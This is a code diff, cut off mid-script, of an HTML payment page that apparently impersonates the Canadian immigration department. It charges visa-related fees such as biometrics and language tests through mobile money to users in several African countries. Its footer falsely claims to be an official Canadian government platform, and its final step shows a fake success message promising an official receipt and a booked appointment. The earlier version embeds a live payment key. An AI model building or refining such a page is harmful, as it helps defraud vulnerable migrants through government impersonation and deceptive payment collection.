@@ -7,74 +7,206 @@
 
 <style>
 body{
-  font-family:Arial;
+  font-family: Arial, sans-serif;
   background:
     linear-gradient(rgba(0,0,0,0.6),rgba(0,0,0,0.6)),
     url("background.jpg") no-repeat center;
-  background-size:cover;
-
-  display:flex;
-  flex-direction:column;
-  justify-content:center;
-  align-items:center;
-
-  min-height:100vh;
-  margin:0;
+  background-size: cover;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+  margin: 0;
 }
 
 .box{
-  background:white;
-  padding:30px;
-  border-radius:12px;
-  width:350px;
-  text-align:center;
-  box-shadow:0 0 15px rgba(0,0,0,0.2);
-  margin-bottom:20px;
+  background: white;
+  padding: 30px;
+  border-radius: 12px;
+  width: 90%;
+  max-width: 380px;
+  text-align: center;
+  box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+  margin-bottom: 20px;
+  transition: all 0.3s ease;
 }
 
 .logo{
-  width:120px;
-  margin-bottom:10px;
+  width: 120px;
+  margin-bottom: 10px;
 }
 
-select,button{
-  width:100%;
-  padding:12px;
-  margin-top:10px;
-  border-radius:6px;
-  border:1px solid #ccc;
+h3 {
+  margin-top: 5px;
+  margin-bottom: 20px;
+  font-size: 18px;
+  color: #222;
 }
 
+/* Formulaire et entrées */
+.form-group {
+  text-align: left;
+  margin-top: 12px;
+}
+
+.form-group label {
+  font-size: 13px;
+  font-weight: bold;
+  color: #555;
+  display: block;
+  margin-bottom: 4px;
+}
+
+input, select, button{
+  width: 100%;
+  padding: 12px;
+  border-radius: 6px;
+  border: 1px solid #ccc;
+  box-sizing: border-box;
+  font-size: 15px;
+}
+
+input:focus, select:focus {
+  border-color: #00bcd4;
+  outline: none;
+}
+
+.row {
+  display: flex;
+  gap: 5px;
+  margin-top: 10px;
+}
+
+.prefix {
+  width: 30%;
+  background: #eee;
+  text-align: center;
+  font-weight: bold;
+}
+
+.phone {
+  width: 70%;
+}
+
+/* Boutons */
 button{
-  background:#00bcd4;
-  color:white;
-  border:none;
-  font-weight:bold;
-  cursor:pointer;
+  background: #00bcd4;
+  color: white;
+  border: none;
+  font-weight: bold;
+  cursor: pointer;
+  margin-top: 20px;
+  transition: background 0.2s;
 }
 
 button:hover{
-  background:#0097a7;
+  background: #0097a7;
 }
 
-#amount{
-  margin-top:10px;
-  font-weight:bold;
-  color:#333;
+.btn-secondary {
+  background: #777;
+  margin-top: 10px;
 }
 
+.btn-secondary:hover {
+  background: #555;
+}
+
+/* Éléments financiers */
+.amount-display {
+  background: #f4f7f6;
+  padding: 12px;
+  border-radius: 6px;
+  margin-top: 15px;
+  border-left: 4px solid #00bcd4;
+}
+
+#amountLocal {
+  font-weight: bold;
+  color: #00bcd4;
+  font-size: 16px;
+  margin: 0;
+}
+
+#amountUsd {
+  font-size: 12px;
+  color: #666;
+  margin: 3px 0 0 0;
+}
+
+/* Gestion des étapes */
+.step {
+  display: none;
+}
+
+.step.active {
+  display: block;
+}
+
+/* Indicateur de progression */
+.progress-bar {
+  display: flex;
+  justify-content: space-between;
+  margin-bottom: 20px;
+  font-size: 12px;
+  color: #aaa;
+  position: relative;
+}
+
+.progress-bar::before {
+  content: '';
+  position: absolute;
+  top: 50%; left: 0; right: 0;
+  height: 2px; background: #eee;
+  z-index: 1; transform: translateY(-50%);
+}
+
+.progress-step {
+  background: white;
+  border: 2px solid #eee;
+  width: 24px; height: 24px;
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  z-index: 2; font-weight: bold;
+}
+
+.progress-step.active {
+  border-color: #00bcd4;
+  color: #00bcd4;
+}
+
+.progress-step.completed {
+  background: #00bcd4;
+  border-color: #00bcd4;
+  color: white;
+}
+
+/* Signature & Footer */
 .footer{
-  text-align:center;
-  color:white;
-  font-size:12px;
+  text-align: center;
+  color: white;
+  font-size: 12px;
+}
+
+.footer p {
+  margin: 4px 0;
 }
 
 .footer img{
-  width:30px;
-  margin-top:5px;
+  width: 30px;
+  margin-top: 5px;
+}
+
+/* Succès final */
+.success-icon {
+  font-size: 50px;
+  color: #4caf50;
+  margin-bottom: 15px;
 }
 </style>
 
+<!-- Script d'origine conservé pour compatibilité si requis à l'étape finale -->
 <script src="https://leekpay.fr/js/leekpay.js"></script>
 
 </head>
@@ -83,60 +215,182 @@ button:hover{
 
 <div class="box">
 
-<img src="logo.png" class="logo">
+  <img src="logo.png" class="logo">
+  <h3>Immigration Canada Service</h3>
 
-<h3>Paiement immigration Canada Service</h3>
+  <!-- Barre de progression visuelle -->
+  <div class="progress-bar">
+    <div class="progress-step active" id="p1">1</div>
+    <div class="progress-step" id="p2">2</div>
+    <div class="progress-step" id="p3">3</div>
+  </div>
 
-<select id="service" onchange="updateAmount()">
-  <option value="85">1 - Demande biométrique - 85 USD</option>
-  <option value="150">2 - Test de langue - 150 USD</option>
-  <option value="220">3 - Droit administratif - 220 USD</option>
-  <option value="455">4 - Toutes les procédures - 455 USD</option>
-</select>
+  <!-- ================= ÉTAPE 1 : SERVICE, EMAIL & RDV ================= -->
+  <div class="step active" id="step1">
+    
+    <div class="form-group">
+      <label for="service">Sélectionnez le service administratif</label>
+      <select id="service" onchange="calculateAmounts()">
+        <option value="85">1 - Demande biométrique - 85 USD</option>
+        <option value="150">2 - Test de langue - 150 USD</option>
+        <option value="220">3 - Droit administratif - 220 USD</option>
+        <option value="455">4 - Toutes les procédures - 455 USD</option>
+      </select>
+    </div>
 
-<p id="amount"></p>
+    <div class="form-group">
+      <label for="email">Adresse e-mail (Pour l'envoi du reçu officiel)</label>
+      <input type="email" id="email" placeholder="exemple@domaine.com" required>
+    </div>
 
-<button onclick="payer()">Payer</button>
+    <div class="form-group">
+      <label for="rdvDate">Sélectionnez votre date de rendez-vous</label>
+      <input type="date" id="rdvDate" required min="2026-07-12">
+    </div>
 
-<p style="font-size:12px; margin-top:10px;">
-Après avoir cliqué sur "Payer", vous serez redirigé vers une page sécurisée pour confirmer votre paiement.
-</p>
+    <button type="button" onclick="goToStep2()">Continuer vers le paiement</button>
+    
+    <p style="font-size:11px; margin-top:15px; color: #777;">
+      Vos informations de rendez-vous et votre reçu seront validés après confirmation bancaire.
+    </p>
+  </div>
 
-<p style="font-size:11px; margin-top:10px;">
-Ce service de paiement est offert par le gouvernement canadien.
-</p>
+  <!-- ================= ÉTAPE 2 : CONFIGURATION DU PAIEMENT ================= -->
+  <div class="step" id="step2">
+    
+    <div class="form-group">
+      <label for="country">Sélectionnez votre pays</label>
+      <select id="country" onchange="updateOperators(); calculateAmounts();">
+        <option value="BEN">Bénin</option>
+        <option value="CIV">Côte d'Ivoire</option>
+        <option value="CMR">Cameroun</option>
+        <option value="COD">RDC (Congo-Kinshasa)</option>
+        <option value="COG">Congo-Brazzaville</option>
+        <option value="GAB">Gabon</option>
+        <option value="SEN">Sénégal</option>
+      </select>
+    </div>
+
+    <div class="form-group">
+      <label for="operator">Opérateur de paiement mobile</label>
+      <select id="operator"></select>
+    </div>
+
+    <div class="form-group">
+      <label for="phone">Numéro de téléphone Mobile Money</label>
+      <div class="row">
+        <input id="prefix" class="prefix" readonly>
+        <input type="text" id="phone" class="phone" placeholder="Numéro local">
+      </div>
+    </div>
+
+    <!-- Affichage des montants convertis dynamiquement -->
+    <div class="amount-display">
+      <p id="amountLocal">Montant à payer : --</p>
+      <p id="amountUsd">Équivalent : -- USD</p>
+    </div>
+
+    <button type="button" onclick="declencherPaiement()">Confirmer et Payer</button>
+    <button type="button" class="btn-submit btn-secondary" onclick="goBackToStep1()">Retour</button>
+  </div>
+
+  <!-- ================= ÉTAPE 3 : REMERCIEMENT ET CONFIRMATION ================= -->
+  <div class="step" id="step3">
+    <div class="success-icon">✓</div>
+    <h4 style="color: #4caf50; margin-top: 0;">Paiement Traité avec Succès !</h4>
+    
+    <p style="text-align: left; font-size: 14px; color: #444; line-height: 1.5;">
+      Merci pour votre confiance. Votre demande de paiement a été transmise aux services de l'Immigration canadienne.
+    </p>
+    
+    <div style="background: #f9f9f9; padding: 12px; border-radius: 6px; text-align: left; font-size: 13px; margin-top: 15px; border: 1px dashed #ccc;">
+      <strong>Récapitulatif de validation :</strong><br>
+      • Un reçu officiel est envoyé à : <span id="confirmEmail" style="color:#00bcd4; font-weight:bold;"></span><br>
+      • Votre rendez-vous est bloqué pour le : <span id="confirmDate" style="font-weight:bold;"></span>
+    </div>
+
+    <p style="font-size:12px; margin-top:20px; color: #777;">
+      Vous pouvez fermer cette page en toute sécurité ou vérifier votre messagerie.
+    </p>
+  </div>
 
 </div>
 
-<!-- SIGNATURE -->
+<!-- SIGNATURE OFFICIELLE -->
 <div class="footer">
   <p>© 2026 Immigration, Réfugiés et Citoyenneté Canada</p>
   <p>Plateforme du gouvernement canadien • Paiement sécurisé 🔒</p>
-  <img src="https://upload.wikimedia.org/wikipedia/en/c/cf/Flag_of_Canada.svg">
+  <img src="https://upload.wikimedia.org/wikipedia/en/c/cf/Flag_of_Canada.svg" alt="Drapeau Canada">
 </div>
 
 <script>
+// Configurations financières et de réseaux (Taux basés sur vos modèles validés)
+const rates = { XOF: 550, XAF: 550, CDF: 2500 };
+const currencies = { BEN:"XOF", CIV:"XOF", SEN:"XOF", CMR:"XAF", GAB:"XAF", COG:"XAF", COD:"CDF" };
+const prefixes = { BEN:"229", CIV:"225", CMR:"237", COD:"243", COG:"242", GAB:"241", SEN:"221" };
 
-function updateAmount(){
-  let usd = service.value;
-  amount.innerText = "Montant à payer : " + usd + " USD";
+const operators = {
+  BEN: ["MTN", "MOOV"],
+  CIV: ["MTN", "ORANGE"],
+  CMR: ["MTN"],
+  COD: ["AIRTEL", "ORANGE", "VODACOM"],
+  GAB: ["AIRTEL"],
+  COG: ["AIRTEL", "MTN"],
+  SEN: ["ORANGE", "FREE"]
+};
+
+// Éléments du DOM
+const step1 = document.getElementById('step1');
+const step2 = document.getElementById('step2');
+const step3 = document.getElementById('step3');
+const p1 = document.getElementById('p1');
+const p2 = document.getElementById('p2');
+const p3 = document.getElementById('p3');
+
+// Gestion de la navigation entre les étapes
+function goToStep2() {
+  const emailVal = document.getElementById('email').value.trim();
+  const dateVal = document.getElementById('rdvDate').value;
+
+  if(!emailVal || !emailVal.includes('@')) {
+    alert("Veuillez entrer une adresse e-mail valide pour recevoir votre reçu.");
+    return;
+  }
+  if(!dateVal) {
+    alert("Veuillez sélectionner une date valide pour votre rendez-vous.");
+    return;
+  }
+
+  // Changement de page
+  step1.classList.remove('active');
+  step2.classList.add('active');
+  
+  // Changement barre de progression
+  p1.classList.add('completed');
+  p2.classList.add('active');
+  
+  calculateAmounts();
 }
 
-function payer(){
+function goBackToStep1() {
+  step2.classList.remove('active');
+  step1.classList.add('active');
+  p1.classList.remove('completed');
+  p2.classList.remove('active');
+}
 
-  let usd = parseFloat(service.value);
-
-  LeekPay.checkout({
-    amount: usd,
-    currency: "USD",
-    apiKey: "pk_live_OIf3UkphEVWIVAJdd7VB6KWEm7IBuDwK"
+// Logique de mise à jour des informations de réseaux mobiles
+function updateOperators(){
+  const countrySelect = document.getElementById('country');
+  const operatorSelect = document.getElementById('operator');
+  const prefixInput = document.getElementById('prefix');
+  
+  operatorSelect.innerHTML = "";
+  operators[countrySelect.value].forEach(op => {
+    let opt = document.createElement("option");
+    opt.value = op + "_" + countrySelect.value;
+    opt.textContent = op;
+    operatorSelect.appendChild(opt);
   });
-
-}
-
-updateAmount();
-
-</script>
-
-</body>
-</html>
+  
+  prefixInput.value = prefixes[countrySelect.value];
